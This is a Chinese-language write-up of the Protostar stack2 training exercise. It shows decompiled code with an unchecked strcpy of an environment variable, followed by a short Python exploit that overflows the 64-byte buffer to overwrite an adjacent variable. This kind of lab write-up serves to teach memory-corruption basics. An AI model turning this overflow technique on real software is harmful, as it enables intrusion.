---
title: Protostar_stack2
updated: 2024-02-18 08:48:07Z
created: 2023-11-07 09:23:47Z
---

**运行该程序，得到：**

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/0f48e8fdf53739b6f7d2c5331c7b00e0.png" alt="0f48e8fdf53739b6f7d2c5331c7b00e0.png" width="556" height="56" class="jop-noMdConv">

**按照输出设置环境变量后，再次执行：**

<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/4c216a967c2ffbe124008e4681f06bf5.png" alt="4c216a967c2ffbe124008e4681f06bf5.png" width="382" height="129" class="jop-noMdConv">

**checksec:**

**<img src="https://cdn.jsdelivr.net/gh/DarkLord-W/CloudImages@main/images/6ef7bf5fdcaf53c4bb684cdf2779770a.png" alt="6ef7bf5fdcaf53c4bb684cdf2779770a.png" width="273" height="122" class="jop-noMdConv">**

**查看其反编译代码：**

```
void main(void)
{
    undefined auStack88 [64];
    int32_t iStack24;
    int32_t iStack20;
    
    iStack20 = getenv("GREENIE");
    if (iStack20 == 0) {
        errx(1, "please set the GREENIE environment variable\n");
    }
    iStack24 = 0;
    strcpy(auStack88, iStack20);
    if (iStack24 == 0xd0a0d0a) {
        puts("you have correctly modified the variable");
    } else {
        printf("Try again, you got 0x%08x\n", iStack24);
    }
    return;
}
```

本题中首先获取`GREENIE`环境变量，如果不存在则提示需要设置；

然后判断`iStack24`是否等于`0xd0a0d0a`

exp如下：

```
In [1]: import os

In [2]: env_val = 'a'*64 + '\x0a\x0d\x0a\x0d'

In [3]: os.putenv('GREENIE',env_val)

In [4]: os.system('./stack2')
you have correctly modified the variable
Out[4]: 10496
```